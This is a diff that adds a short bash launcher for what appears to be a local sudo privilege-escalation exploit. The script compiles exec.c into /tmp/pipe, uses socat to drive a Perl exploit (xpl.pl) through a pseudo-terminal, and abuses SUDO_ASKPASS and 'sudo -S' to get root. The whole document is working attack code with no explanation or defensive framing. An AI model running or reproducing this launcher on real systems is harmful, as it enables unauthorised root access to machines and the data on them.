@@ -1,0 +1,9 @@
+#!/bin/bash
+# You will need socat to run this.
+# You can download a static version of socat here: https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
+cc -w exec.c -o /tmp/pipe
+socat pty,link=/tmp/pty,waitslave exec:"perl xpl.pl"&
+sleep 0.5
+export SUDO_ASKPASS=/tmp/pipe
+sudo -k -S id < /tmp/pty
+/tmp/pipe
